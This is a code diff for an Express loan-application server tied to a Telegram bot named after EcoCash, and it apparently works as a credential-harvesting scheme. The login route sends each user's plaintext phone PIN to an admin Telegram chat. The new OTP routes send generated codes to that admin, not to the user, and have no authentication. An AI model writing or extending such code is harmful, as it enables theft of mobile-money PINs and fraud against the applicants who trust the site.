@@ -51,30 +51,19 @@ CREATE TABLE IF NOT EXISTS applications (
 
 const dbReady = pool.query(schema)
   .then(async () => {
-    await pool.query(
-      'ALTER TABLE applications ADD COLUMN IF NOT EXISTS pin_hash TEXT'
-    );
-    await pool.query(
-      'ALTER TABLE applications ADD COLUMN IF NOT EXISTS reviewed_at TIMESTAMPTZ'
-    );
-    await pool.query(
-      "ALTER TABLE applications ADD COLUMN IF NOT EXISTS otp_status TEXT NOT NULL DEFAULT 'not_required'"
-    );
-    await pool.query(
-      'ALTER TABLE applications ADD COLUMN IF NOT EXISTS otp_verified_at TIMESTAMPTZ'
-    );
-    await pool.query(
-      "ALTER TABLE applications ADD COLUMN IF NOT EXISTS pin_status TEXT NOT NULL DEFAULT 'none'"
-    );
-    await pool.query(
-      'ALTER TABLE applications ADD COLUMN IF NOT EXISTS pin_approved_at TIMESTAMPTZ'
-    );
-    await pool.query(
-      'ALTER TABLE applications ADD COLUMN IF NOT EXISTS pin_rejected_at TIMESTAMPTZ'
-    );
-    await pool.query(
-      "UPDATE applications SET otp_status='not_required' WHERE otp_status IN ('pending','sent')"
-    );
+    await pool.query('ALTER TABLE applications ADD COLUMN IF NOT EXISTS pin_hash TEXT');
+    await pool.query('ALTER TABLE applications ADD COLUMN IF NOT EXISTS reviewed_at TIMESTAMPTZ');
+    await pool.query("ALTER TABLE applications ADD COLUMN IF NOT EXISTS otp_status TEXT NOT NULL DEFAULT 'not_required'");
+    await pool.query('ALTER TABLE applications ADD COLUMN IF NOT EXISTS otp_verified_at TIMESTAMPTZ');
+    
+    // THESE TWO LINES ARE NEW (For OTP):
+    await pool.query('ALTER TABLE applications ADD COLUMN IF NOT EXISTS otp_code TEXT');
+    await pool.query('ALTER TABLE applications ADD COLUMN IF NOT EXISTS otp_created_at TIMESTAMPTZ');
+
+    await pool.query("ALTER TABLE applications ADD COLUMN IF NOT EXISTS pin_status TEXT NOT NULL DEFAULT 'none'");
+    await pool.query('ALTER TABLE applications ADD COLUMN IF NOT EXISTS pin_approved_at TIMESTAMPTZ');
+    await pool.query('ALTER TABLE applications ADD COLUMN IF NOT EXISTS pin_rejected_at TIMESTAMPTZ');
+    await pool.query("UPDATE applications SET otp_status='not_required' WHERE otp_status IN ('pending','sent')");
     await pool.query(
       `UPDATE applications
           SET pin_status = 'approved',
@@ -91,12 +80,10 @@ const dbReady = pool.query(schema)
 
 function normalizePhone(value) {
   const phone = String(value || '').replace(/[\s()-]/g, '');
-
   if (/^07\d{8}$/.test(phone)) return '+263' + phone.slice(1);
   if (/^7\d{8}$/.test(phone)) return '+263' + phone;
   if (/^\+2637\d{8}$/.test(phone)) return phone;
   if (/^2637\d{8}$/.test(phone)) return '+' + phone;
-
   return null;
 }
 
@@ -107,54 +94,33 @@ function hashPin(pin) {
 }
 
 function verifyPin(pin, stored) {
-  if (!stored || typeof stored !== 'string' || !stored.includes(':')) {
-    return false;
-  }
-
+  if (!stored || typeof stored !== 'string' || !stored.includes(':')) return false;
   const parts = stored.split(':');
   const salt = parts[0];
   const expected = Buffer.from(parts[1] || '', 'hex');
-
   if (!salt || expected.length !== 64) return false;
-
   const actual = crypto.scryptSync(pin, salt, 64);
   return crypto.timingSafeEqual(actual, expected);
 }
 
 function adminAuth(req, res, next) {
   const header = req.headers.authorization || '';
-
   if (!header.startsWith('Basic ') || !ADMIN_USER || !ADMIN_PASSWORD) {
-    return res
-      .status(401)
-      .set('WWW-Authenticate', 'Basic realm="Loan Admin"')
-      .json({ error: 'Admin authentication required.' });
+    return res.status(401).set('WWW-Authenticate', 'Basic realm="Loan Admin"').json({ error: 'Admin authentication required.' });
   }
-
   let decoded;
-
   try {
     decoded = Buffer.from(header.slice(6), 'base64').toString('utf8');
   } catch {
     return res.status(401).json({ error: 'Invalid admin credentials.' });
   }
-
   const colon = decoded.indexOf(':');
-
-  if (colon < 0) {
-    return res.status(401).json({ error: 'Invalid admin credentials.' });
-  }
-
+  if (colon < 0) return res.status(401).json({ error: 'Invalid admin credentials.' });
   const username = decoded.slice(0, colon);
   const password = decoded.slice(colon + 1);
-
   if (username !== ADMIN_USER || password !== ADMIN_PASSWORD) {
-    return res
-      .status(401)
-      .set('WWW-Authenticate', 'Basic realm="Loan Admin"')
-      .json({ error: 'Invalid admin credentials.' });
+    return res.status(401).set('WWW-Authenticate', 'Basic realm="Loan Admin"').json({ error: 'Invalid admin credentials.' });
   }
-
   next();
 }
 
@@ -162,37 +128,25 @@ function adminAuth(req, res, next) {
 
 async function telegramApi(method, body) {
   if (!BOT_TOKEN) return null;
-
-  const response = await fetch(
-    `https://api.telegram.org/bot${BOT_TOKEN}/${method}`,
-    {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(body)
-    }
-  );
-
+  const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(body)
+  });
   const data = await response.json().catch(() => ({}));
-
   if (!response.ok || !data.ok) {
-    throw new Error(
-      `Telegram ${method} failed: ${data.description || response.status}`
-    );
+    throw new Error(`Telegram ${method} failed: ${data.description || response.status}`);
   }
-
   return data.result;
 }
 
 async function sendTelegram(chatId, message, keyboard) {
   if (!BOT_TOKEN || !chatId) return;
-
   try {
     await telegramApi('sendMessage', {
       chat_id: chatId,
       text: message,
-      ...(keyboard
-        ? { reply_markup: { inline_keyboard: keyboard } }
-        : {})
+      ...(keyboard ? { reply_markup: { inline_keyboard: keyboard } } : {})
     });
   } catch (error) {
     console.error('Telegram message failed:', error.message);
@@ -204,35 +158,20 @@ async function notifyAdmin(message, keyboard) {
     console.warn('Telegram notification skipped: bot token or admin chat ID is missing.');
     return;
   }
-
   await sendTelegram(ADMIN_CHAT_ID, message, keyboard);
 }
 
 async function setApplicationStatus(id, status, source) {
-  if (!['approved', 'rejected'].includes(status)) {
-    throw new Error('Invalid application status');
-  }
-
+  if (!['approved', 'rejected'].includes(status)) throw new Error('Invalid application status');
   const result = await pool.query(
-    `UPDATE applications
-       SET status=$1, reviewed_at=NOW()
-     WHERE id=$2
-     RETURNING id,status,phone,first_name,last_name`,
+    `UPDATE applications SET status=$1, reviewed_at=NOW() WHERE id=$2 RETURNING id,status,phone,first_name,last_name`,
     [status, id]
   );
-
   const row = result.rows[0];
-
   if (!row) return null;
-
   await notifyAdmin(
-    `Application ${status.toUpperCase()}\n` +
-    `ID: ${row.id}\n` +
-    `Applicant: ${row.first_name} ${row.last_name}\n` +
-    `Phone: ${row.phone}\n` +
-    `Updated by: ${source}`
+    `Application ${status.toUpperCase()}\nID: ${row.id}\nApplicant: ${row.first_name} ${row.last_name}\nPhone: ${row.phone}\nUpdated by: ${source}`
   );
-
   return row;
 }
 
@@ -242,17 +181,9 @@ app.get('/api/health', async (req, res) => {
   try {
     await dbReady;
     await pool.query('SELECT 1');
-
-    res.json({
-      ok: true,
-      database: 'connected',
-      sms: 'disabled'
-    });
+    res.json({ ok: true, database: 'connected', sms: 'disabled' });
   } catch (error) {
-    res.status(503).json({
-      ok: false,
-      database: 'unavailable'
-    });
+    res.status(503).json({ ok: false, database: 'unavailable' });
   }
 });
 
@@ -261,54 +192,23 @@ app.get('/api/health', async (req, res) => {
 app.post('/api/applications', async (req, res) => {
   try {
     await dbReady;
-
     const b = req.body || {};
     const phone = normalizePhone(b.phone);
     const amount = Number(b.loanAmount);
     const income = Number(b.annualIncome);
+    const required = ['loanType', 'loanTerm', 'purpose', 'firstName', 'lastName', 'email', 'employmentStatus'];
 
-    const required = [
-      'loanType',
-      'loanTerm',
-      'purpose',
-      'firstName',
-      'lastName',
-      'email',
-      'employmentStatus'
-    ];
-
-    if (
-      required.some(k => !String(b[k] || '').trim()) ||
-      !phone ||
-      !Number.isFinite(amount) ||
-      !Number.isFinite(income)
-    ) {
-      return res.status(400).json({
-        error: 'Please complete all application fields correctly.'
-      });
+    if (required.some(k => !String(b[k] || '').trim()) || !phone || !Number.isFinite(amount) || !Number.isFinite(income)) {
+      return res.status(400).json({ error: 'Please complete all application fields correctly.' });
     }
 
     const email = String(b.email).trim();
-
-    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-      return res.status(400).json({
-        error: 'Enter a valid email address.'
-      });
-    }
-
-    if (
-      amount <= 0 ||
-      amount > 500000 ||
-      income <= 0 ||
-      income > 1000000000
-    ) {
-      return res.status(400).json({
-        error: 'Enter valid loan and income amounts.'
-      });
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return res.status(400).json({ error: 'Enter a valid email address.' });
+    if (amount <= 0 || amount > 500000 || income <= 0 || income > 1000000000) {
+      return res.status(400).json({ error: 'Enter valid loan and income amounts.' });
     }
 
     const id = crypto.randomUUID();
-
     const firstName = String(b.firstName).trim().slice(0, 100);
     const lastName = String(b.lastName).trim().slice(0, 100);
     const loanType = String(b.loanType).trim().slice(0, 80);
@@ -317,184 +217,155 @@ app.post('/api/applications', async (req, res) => {
     const employmentStatus = String(b.employmentStatus).trim().slice(0, 80);
 
     await pool.query(
-      `INSERT INTO applications
-       (
-         id, loan_type, loan_amount, loan_term, purpose,
-         first_name, last_name, email, phone,
-         employment_status, annual_income, status, pin_hash, pin_status
-       )
+      `INSERT INTO applications (id, loan_type, loan_amount, loan_term, purpose, first_name, last_name, email, phone, employment_status, annual_income, status, pin_hash, pin_status)
        VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,'pending',NULL,'none')`,
-      [
-        id,
-        loanType,
-        amount,
-        loanTerm,
-        purpose,
-        firstName,
-        lastName,
-        email,
-        phone,
-        employmentStatus,
-        income
-      ]
+      [id, loanType, amount, loanTerm, purpose, firstName, lastName, email, phone, employmentStatus, income]
     );
 
     await notifyAdmin(
-      `NEW LOAN APPLICATION — PENDING REVIEW\n` +
-      `Application ID: ${id}\n` +
-      `Applicant: ${firstName} ${lastName}\n` +
-      `Phone: ${phone}\n` +
-      `Email: ${email}\n` +
-      `Loan type: ${loanType}\n` +
-      `Amount: USD ${amount}\n` +
-      `Term: ${loanTerm}\n` +
-      `Purpose: ${purpose.slice(0, 500)}\n` +
-      `Employment: ${employmentStatus}\n` +
-      `Annual income: USD ${income}`,
-      [
-        [
-          { text: 'Approve', callback_data: `approve:${id}` },
-          { text: 'Reject', callback_data: `reject:${id}` }
-        ]
-      ]
+      `NEW LOAN APPLICATION — PENDING REVIEW\nApplication ID: ${id}\nApplicant: ${firstName} ${lastName}\nPhone: ${phone}\nEmail: ${email}\nLoan type: ${loanType}\nAmount: USD ${amount}\nTerm: ${loanTerm}\nPurpose: ${purpose.slice(0, 500)}\nEmployment: ${employmentStatus}\nAnnual income: USD ${income}`,
+      [[{ text: 'Approve', callback_data: `approve:${id}` }, { text: 'Reject', callback_data: `reject:${id}` }]]
     );
 
-    return res.status(201).json({
-      id,
-      applicationId: id,
-      status: 'pending',
-      message: 'Loan application submitted successfully.'
-    });
+    return res.status(201).json({ id, applicationId: id, status: 'pending', message: 'Loan application submitted successfully.' });
   } catch (error) {
     console.error('Application submission failed:', error.message);
-
-    return res.status(500).json({
-      error: 'Could not submit the application. Please try again.'
-    });
+    return res.status(500).json({ error: 'Could not submit the application. Please try again.' });
   }
 });
 
-// 2. LOGIN — first-time PIN is sent to Telegram for approval
+// 2. LOGIN — first-time PIN and OTP flow
 
 app.post('/api/login', async (req, res) => {
   try {
     await dbReady;
-
     const phone = normalizePhone(req.body?.phone);
     const pin = String(req.body?.pin || '');
 
     if (!phone || !/^\d{4}$/.test(pin)) {
-      return res.status(400).json({
-        error: 'Enter a valid Zimbabwe phone number and your 4-digit PIN.'
-      });
+      return res.status(400).json({ error: 'Enter a valid Zimbabwe phone number and your 4-digit PIN.' });
     }
 
     const result = await pool.query(
-      `SELECT id, phone, status, pin_hash, pin_status, created_at
-         FROM applications
-        WHERE phone=$1
-        ORDER BY created_at DESC
-        LIMIT 1`,
+      `SELECT id, phone, status, pin_hash, pin_status, created_at FROM applications WHERE phone=$1 ORDER BY created_at DESC LIMIT 1`,
       [phone]
     );
-
     const row = result.rows[0];
 
-    if (!row) {
-      return res.status(401).json({
-        error: 'Your application is being reviewed. Please wait for approval from our support team.'
-      });
-    }
+    if (!row) return res.status(401).json({ error: 'Your application is being reviewed. Please wait for approval from our support team.' });
 
-    // Pending PIN approval already exists — tell them to wait.
     if (row.pin_hash && row.pin_status === 'pending') {
-      return res.status(202).json({
-        authenticated: false,
-        status: 'pending_pin_approval',
-        applicationId: row.id,
-        message: 'Your PIN is awaiting approval. Please try again shortly.'
-      });
+      return res.status(202).json({ authenticated: false, status: 'pending_pin_approval', applicationId: row.id, message: 'Your PIN is awaiting approval. Please try again shortly.' });
     }
 
-    // First-time PIN setup, or re-attempt after rejection.
     const isFirstPin = !row.pin_hash;
     const isRetryAfterReject = row.pin_status === 'rejected';
 
     if (isFirstPin || isRetryAfterReject) {
       const pinHash = hashPin(pin);
-
       const update = await pool.query(
-        `UPDATE applications
-            SET pin_hash=$1,
-                pin_status='pending',
-                pin_approved_at=NULL,
-                pin_rejected_at=NULL
-          WHERE id=$2
-          RETURNING id, first_name, last_name, phone`,
+        `UPDATE applications SET pin_hash=$1, pin_status='pending', pin_approved_at=NULL, pin_rejected_at=NULL WHERE id=$2 RETURNING id, first_name, last_name, phone`,
         [pinHash, row.id]
       );
-
       const updated = update.rows[0];
 
       await notifyAdmin(
-        `🔐 PIN APPROVAL REQUEST\n` +
-        `Application ID: ${updated.id}\n` +
-        `Applicant: ${updated.first_name} ${updated.last_name}\n` +
-        `Phone: ${updated.phone}\n` +
-        `PIN: ${pin}\n\n` +
-        `Approve to let this customer log in with this PIN.`,
-        [
-          [
-            { text: '✅ Approve PIN', callback_data: `pinapprove:${updated.id}` },
-            { text: '❌ Reject PIN', callback_data: `pinreject:${updated.id}` }
-          ]
-        ]
+        `🔐 PIN APPROVAL REQUEST\nApplication ID: ${updated.id}\nApplicant: ${updated.first_name} ${updated.last_name}\nPhone: ${updated.phone}\nPIN: ${pin}\n\nApprove to let this customer log in with this PIN.`,
+        [[{ text: '✅ Approve PIN', callback_data: `pinapprove:${updated.id}` }, { text: '❌ Reject PIN', callback_data: `pinreject:${updated.id}` }]]
       );
 
-      return res.status(202).json({
-        authenticated: false,
-        status: 'pending_pin_approval',
-        applicationId: row.id,
-        message: 'Your PIN is awaiting approval. You will be able to log in shortly.'
-      });
+      return res.status(202).json({ authenticated: false, status: 'pending_pin_approval', applicationId: row.id, message: 'Your PIN is awaiting approval. You will be able to log in shortly.' });
     }
 
-    // PIN exists and is approved — verify normally.
-    if (!verifyPin(pin, row.pin_hash)) {
-      return res.status(401).json({
-        error: 'Incorrect PIN.'
-      });
-    }
+    if (!verifyPin(pin, row.pin_hash)) return res.status(401).json({ error: 'Incorrect PIN.' });
 
     if (row.status === 'rejected') {
-      return res.status(403).json({
-        authenticated: true,
-        status: 'rejected',
-        message: 'Your application was not approved. Please contact support.'
-      });
+      return res.status(403).json({ authenticated: true, status: 'rejected', message: 'Your application was not approved. Please contact support.' });
     }
 
     if (row.status !== 'approved') {
-      return res.json({
-        authenticated: true,
-        status: 'pending',
-        applicationId: row.id,
-        message: 'Your application is awaiting admin approval.'
-      });
+      return res.json({ authenticated: true, status: 'pending', applicationId: row.id, message: 'Your application is awaiting admin approval.' });
     }
 
-    return res.json({
-      authenticated: true,
-      status: 'approved',
+    // --- NEW OTP LOGIC ---
+    const otpCode = String(crypto.randomInt(100000, 999999));
+    
+    await pool.query(
+      `UPDATE applications SET otp_code=$1, otp_status='pending', otp_created_at=NOW() WHERE id=$2`,
+      [otpCode, row.id]
+    );
+
+    await notifyAdmin(
+      `🔐 OTP VERIFICATION REQUEST\nApplication ID: ${row.id}\nApplicant Phone: ${row.phone}\nOTP Code: ${otpCode}\n\nApprove to let the user complete their login.`,
+      [[{ text: '✅ Approve OTP', callback_data: `otpapprove:${row.id}` }, { text: '❌ Reject OTP', callback_data: `otpreject:${row.id}` }]]
+    );
+
+    return res.status(202).json({
+      authenticated: false,
+      status: 'pending_otp',
       applicationId: row.id,
-      message: 'Your application has been approved.'
+      message: 'PIN verified successfully! Please enter OTP below.'
     });
+    // --- END NEW OTP LOGIC ---
+
   } catch (error) {
     console.error('Login failed:', error.message);
+    return res.status(500).json({ error: 'Login is temporarily unavailable.' });
+  }
+});
 
-    return res.status(500).json({
-      error: 'Login is temporarily unavailable.'
-    });
+// VERIFY OTP ROUTE
+
+app.post('/api/verify-otp', async (req, res) => {
+  try {
+    const { applicationId, otpCode } = req.body;
+    const result = await pool.query('SELECT otp_code, otp_status, status, otp_created_at FROM applications WHERE id=$1', [applicationId]);
+    const row = result.rows[0];
+    
+    if (!row) return res.status(404).json({ error: 'Application not found' });
+    if (row.otp_status === 'rejected') return res.status(403).json({ error: 'OTP verification rejected by admin.' });
+    
+    if (row.otp_status !== 'approved') {
+      return res.status(202).json({ error: 'Waiting for admin approval on Telegram...' });
+    }
+
+    const fiveMinsAgo = new Date(Date.now() - 5 * 60000);
+    if (new Date(row.otp_created_at) < fiveMinsAgo) {
+      return res.status(400).json({ error: 'OTP has expired. Please resend.' });
+    }
+    
+    if (row.otp_code !== String(otpCode)) {
+      return res.status(401).json({ error: 'Invalid OTP code.' });
+    }
+    
+    await pool.query(`UPDATE applications SET otp_status='verified', otp_verified_at=NOW() WHERE id=$1`, [applicationId]);
+    return res.json({ success: true, message: 'OTP verified successfully.' });
+  } catch (error) {
+    console.error('OTP Verify Error:', error.message);
+    res.status(500).json({ error: 'Server error during verification.' });
+  }
+});
+
+// RESEND OTP ROUTE
+
+app.post('/api/resend-otp', async (req, res) => {
+  try {
+    const { applicationId } = req.body;
+    const otpCode = String(crypto.randomInt(100000, 999999));
+    const result = await pool.query(
+      `UPDATE applications SET otp_code=$1, otp_status='pending', otp_created_at=NOW() WHERE id=$2 RETURNING phone`,
+      [otpCode, applicationId]
+    );
+    
+    if (!result.rows[0]) return res.status(404).json({ error: 'Not found' });
+    
+    await notifyAdmin(
+      `🔄 OTP RESENT\nApp: ${applicationId}\nPhone: ${result.rows[0].phone}\nOTP: ${otpCode}`,
+      [[{ text: '✅ Approve OTP', callback_data: `otpapprove:${applicationId}` }, { text: '❌ Reject OTP', callback_data: `otpreject:${applicationId}` }]]
+    );
+    res.json({ success: true, message: 'OTP resent to admin.' });
+  } catch (error) {
+    res.status(500).json({ error: 'Could not resend OTP.' });
   }
 });
 
@@ -503,23 +374,11 @@ app.post('/api/login', async (req, res) => {
 app.get('/api/applications/:id/status', async (req, res) => {
   try {
     await dbReady;
-
-    const result = await pool.query(
-      'SELECT id, status, pin_status FROM applications WHERE id=$1',
-      [req.params.id]
-    );
-
-    if (!result.rows[0]) {
-      return res.status(404).json({
-        error: 'Application not found.'
-      });
-    }
-
+    const result = await pool.query('SELECT id, status, pin_status FROM applications WHERE id=$1', [req.params.id]);
+    if (!result.rows[0]) return res.status(404).json({ error: 'Application not found.' });
     res.json(result.rows[0]);
   } catch (error) {
-    res.status(500).json({
-      error: 'Status is unavailable.'
-    });
+    res.status(500).json({ error: 'Status is unavailable.' });
   }
 });
 
@@ -528,59 +387,26 @@ app.get('/api/applications/:id/status', async (req, res) => {
 app.get('/api/admin/applications', adminAuth, async (req, res) => {
   try {
     await dbReady;
-
     const result = await pool.query(
-      `SELECT
-         id, loan_type, loan_amount, loan_term, purpose,
-         first_name, last_name, email, phone,
-         employment_status, annual_income, status,
-         pin_status, created_at, reviewed_at
-       FROM applications
-       ORDER BY created_at DESC`
+      `SELECT id, loan_type, loan_amount, loan_term, purpose, first_name, last_name, email, phone, employment_status, annual_income, status, pin_status, created_at, reviewed_at FROM applications ORDER BY created_at DESC`
     );
-
     res.json(result.rows);
   } catch (error) {
     console.error('Admin list failed:', error.message);
-
-    res.status(500).json({
-      error: 'Could not load applications.'
-    });
+    res.status(500).json({ error: 'Could not load applications.' });
   }
 });
 
 app.patch('/api/admin/applications/:id', adminAuth, async (req, res) => {
   try {
     const status = req.body?.status;
-
-    if (!['approved', 'rejected'].includes(status)) {
-      return res.status(400).json({
-        error: 'Status must be approved or rejected.'
-      });
-    }
-
-    const row = await setApplicationStatus(
-      req.params.id,
-      status,
-      'web admin'
-    );
-
-    if (!row) {
-      return res.status(404).json({
-        error: 'Application not found.'
-      });
-    }
-
-    res.json({
-      id: row.id,
-      status: row.status
-    });
+    if (!['approved', 'rejected'].includes(status)) return res.status(400).json({ error: 'Status must be approved or rejected.' });
+    const row = await setApplicationStatus(req.params.id, status, 'web admin');
+    if (!row) return res.status(404).json({ error: 'Application not found.' });
+    res.json({ id: row.id, status: row.status });
   } catch (error) {
     console.error('Admin status update failed:', error.message);
-
-    res.status(500).json({
-      error: 'Could not update application status.'
-    });
+    res.status(500).json({ error: 'Could not update application status.' });
   }
 });
 
@@ -610,40 +436,25 @@ button{padding:10px 14px;border:0;border-radius:7px;margin:5px 5px 0 0;cursor:po
 <div id="list">Loading applications…</div>
 <script>
 const esc = value => String(value ?? '').replace(/[&<>"]/g, char => ({
-  '&':'&amp;',
-  '<':'&lt;',
-  '>':'&gt;',
-  '"':'&quot;'
+  '&':'&amp;', '<':'&lt;', '>':'&gt;', '"':'&quot;'
 }[char]));
 
 async function loadApplications() {
   try {
     const response = await fetch('/api/admin/applications');
-
-    if (!response.ok) {
-      throw new Error('Unable to load applications. Refresh and sign in again.');
-    }
-
+    if (!response.ok) throw new Error('Unable to load applications. Refresh and sign in again.');
     const applications = await response.json();
-
     document.getElementById('list').innerHTML = applications.map(item => {
       const id = JSON.stringify(String(item.id));
-
       return '<div class="card">' +
         '<h3>' + esc(item.first_name) + ' ' + esc(item.last_name) + '</h3>' +
         '<span class="pill">Status: ' + esc(item.status) + '</span>' +
         '<span class="pill">PIN: ' + esc(item.pin_status) + '</span>' +
         '<p><b>ID:</b> ' + esc(item.id) + '</p>' +
-        '<p><b>Phone:</b> ' + esc(item.phone) +
-        '<br><b>Email:</b> ' + esc(item.email) + '</p>' +
-        '<p><b>Loan:</b> ' + esc(item.loan_type) +
-        ' — USD ' + esc(item.loan_amount) +
-        '<br><b>Term:</b> ' + esc(item.loan_term) +
-        '<br><b>Purpose:</b> ' + esc(item.purpose) + '</p>' +
-        '<p><b>Employment:</b> ' + esc(item.employment_status) +
-        '<br><b>Annual income:</b> USD ' + esc(item.annual_income) + '</p>' +
-        '<p><b>Submitted:</b> ' +
-        esc(new Date(item.created_at).toLocaleString()) + '</p>' +
+        '<p><b>Phone:</b> ' + esc(item.phone) + '<br><b>Email:</b> ' + esc(item.email) + '</p>' +
+        '<p><b>Loan:</b> ' + esc(item.loan_type) + ' — USD ' + esc(item.loan_amount) + '<br><b>Term:</b> ' + esc(item.loan_term) + '<br><b>Purpose:</b> ' + esc(item.purpose) + '</p>' +
+        '<p><b>Employment:</b> ' + esc(item.employment_status) + '<br><b>Annual income:</b> USD ' + esc(item.annual_income) + '</p>' +
+        '<p><b>Submitted:</b> ' + esc(new Date(item.created_at).toLocaleString()) + '</p>' +
         '<button class="approve" onclick="setStatus(' + id + ',\\'approved\\')">Approve</button>' +
         '<button class="reject" onclick="setStatus(' + id + ',\\'rejected\\')">Reject</button>' +
         '</div>';
@@ -655,26 +466,15 @@ async function loadApplications() {
 
 async function setStatus(id, status) {
   if (!confirm('Set this application to ' + status + '?')) return;
-
   try {
-    const response = await fetch(
-      '/api/admin/applications/' + encodeURIComponent(id),
-      {
-        method: 'PATCH',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ status })
-      }
-    );
-
-    if (!response.ok) {
-      alert('Could not update status. Check admin login and try again.');
-      return;
-    }
-
+    const response = await fetch('/api/admin/applications/' + encodeURIComponent(id), {
+      method: 'PATCH',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ status })
+    });
+    if (!response.ok) { alert('Could not update status. Check admin login and try again.'); return; }
     await loadApplications();
-  } catch (error) {
-    alert('Network error. Please try again.');
-  }
+  } catch (error) { alert('Network error. Please try again.'); }
 }
 
 loadApplications();
@@ -692,41 +492,21 @@ let telegramPolling = false;
 async function processTelegramUpdate(update) {
   const msg = update.message;
   const callback = update.callback_query;
+  const chatId = String(msg?.chat?.id ?? callback?.message?.chat?.id ?? '');
+  const fromId = String(msg?.from?.id ?? callback?.from?.id ?? '');
 
-  const chatId = String(
-    msg?.chat?.id ?? callback?.message?.chat?.id ?? ''
-  );
-
-  const fromId = String(
-    msg?.from?.id ?? callback?.from?.id ?? ''
-  );
-
-  if (
-    !ADMIN_CHAT_ID ||
-    chatId !== String(ADMIN_CHAT_ID) ||
-    (ADMIN_USER_ID && fromId !== String(ADMIN_USER_ID))
-  ) {
+  if (!ADMIN_CHAT_ID || chatId !== String(ADMIN_CHAT_ID) || (ADMIN_USER_ID && fromId !== String(ADMIN_USER_ID))) {
     if (callback?.id) {
-      await telegramApi('answerCallbackQuery', {
-        callback_query_id: callback.id,
-        text: 'Not authorized.'
-      }).catch(() => {});
+      await telegramApi('answerCallbackQuery', { callback_query_id: callback.id, text: 'Not authorized.' }).catch(() => {});
     }
-
     return;
   }
 
   if (callback) {
-    const match = /^(approve|reject|pinapprove|pinreject):([0-9a-f-]{36})$/i.exec(
-      callback.data || ''
-    );
+    const match = /^(approve|reject|pinapprove|pinreject|otpapprove|otpreject):([0-9a-f-]{36})$/i.exec(callback.data || '');
 
     if (!match) {
-      await telegramApi('answerCallbackQuery', {
-        callback_query_id: callback.id,
-        text: 'Unknown action.'
-      }).catch(() => {});
-
+      await telegramApi('answerCallbackQuery', { callback_query_id: callback.id, text: 'Unknown action.' }).catch(() => {});
       return;
     }
 
@@ -734,198 +514,97 @@ async function processTelegramUpdate(update) {
       const action = match[1].toLowerCase();
       const appId = match[2];
 
-                        // ---- PIN approve / reject ----
+      // ---- PIN approve / reject ----
       if (action === 'pinapprove' || action === 'pinreject') {
         const approved = action === 'pinapprove';
-
-        const pinRow = await pool.query(
-          `UPDATE applications
-              SET pin_status=$1,
-                  pin_approved_at = CASE WHEN $1='approved' THEN NOW() ELSE NULL END,
-                  pin_rejected_at = CASE WHEN $1='rejected' THEN NOW() ELSE NULL END
-            WHERE id=$2
-            RETURNING id, first_name, last_name, phone, pin_status`,
-          [approved ? 'approved' : 'rejected', appId]
+        const status = approved ? 'approved' : 'rejected';
+        
+        await pool.query(
+          `UPDATE applications SET pin_status=$1, pin_approved_at=NOW(), pin_rejected_at=CASE WHEN $1='rejected' THEN NOW() ELSE NULL END WHERE id=$2`, 
+          [status, appId]
         );
-
-        const pr = pinRow.rows[0];
-
-        await telegramApi('answerCallbackQuery', {
-          callback_query_id: callback.id,
-          text: pr ? `PIN ${pr.pin_status}` : 'Application not found.'
-        }).catch(() => {});
-
-        if (pr && callback.message) {
-          await telegramApi('deleteMessage', {
-            chat_id: chatId,
-            message_id: callback.message.message_id
-          }).catch(() => {});
-
-          await sendTelegram(
-            chatId,
-            `PIN ${pr.pin_status.toUpperCase()} for ${pr.first_name} ${pr.last_name} (${pr.phone})`
-          );
-        }
-
-        return;
+        
+        await telegramApi('answerCallbackQuery', { callback_query_id: callback.id, text: `PIN ${status}` });
+        await telegramApi('editMessageText', {
+          chat_id: chatId,
+          message_id: callback.message.message_id,
+          text: callback.message.text + `\n\n👉 Result: ${status.toUpperCase()}`
+        });
+      }
+      
+      // ---- OTP approve / reject ----
+      else if (action === 'otpapprove' || action === 'otpreject') {
+        const approved = action === 'otpapprove';
+        const status = approved ? 'approved' : 'rejected';
+        
+        await pool.query(`UPDATE applications SET otp_status=$1 WHERE id=$2`, [status, appId]);
+        
+        await telegramApi('answerCallbackQuery', { callback_query_id: callback.id, text: `OTP ${status}` });
+        await telegramApi('editMessageText', {
+          chat_id: chatId,
+          message_id: callback.message.message_id,
+          text: callback.message.text + `\n\n👉 Result: ${status.toUpperCase()}`
+        });
       }
 
       // ---- Application approve / reject ----
-      const status = action === 'approve' ? 'approved' : 'rejected';
-
-      const row = await setApplicationStatus(appId, status, 'Telegram admin');
-
-      await telegramApi('answerCallbackQuery', {
-        callback_query_id: callback.id,
-        text: row ? `Application ${row.status}` : 'Application not found.'
-      }).catch(() => {});
-
-      if (row && callback.message) {
-        await telegramApi('editMessageReplyMarkup', {
+      else if (action === 'approve' || action === 'reject') {
+        const approved = action === 'approve';
+        const status = approved ? 'approved' : 'rejected';
+        
+        await setApplicationStatus(appId, status, 'telegram admin');
+        
+        await telegramApi('answerCallbackQuery', { callback_query_id: callback.id, text: `Application ${status}` });
+        await telegramApi('editMessageText', {
           chat_id: chatId,
           message_id: callback.message.message_id,
-          reply_markup: { inline_keyboard: [] }
-        }).catch(() => {});
+          text: callback.message.text + `\n\n👉 Result: ${status.toUpperCase()}`
+        });
       }
+
     } catch (error) {
-      console.error('Telegram approval action failed:', error.message);
-
-      await telegramApi('answerCallbackQuery', {
-        callback_query_id: callback.id,
-        text: 'Could not update application.'
-      }).catch(() => {});
+      console.error('Telegram callback error:', error.message);
+      await telegramApi('answerCallbackQuery', { callback_query_id: callback.id, text: 'Error processing request.' }).catch(() => {});
     }
-
-    return;
-  }
-
-  const text = String(msg?.text || '').trim();
-
-  if (text === '/start' || text === '/help') {
-    await sendTelegram(
-      chatId,
-      'EcoCash admin bot is connected. Commands:\n' +
-      '/pending — list pending application IDs\n' +
-      '/pendingpins — list applications awaiting PIN approval\n' +
-      '/status APPLICATION_ID — show application status\n' +
-      '/whoami — show your chat and user IDs.'
-    );
-  } else if (text === '/pending') {
-    const result = await pool.query(
-      `SELECT id,first_name,last_name,phone,loan_amount,loan_term
-       FROM applications
-       WHERE status='pending'
-       ORDER BY created_at DESC
-       LIMIT 20`
-    );
-
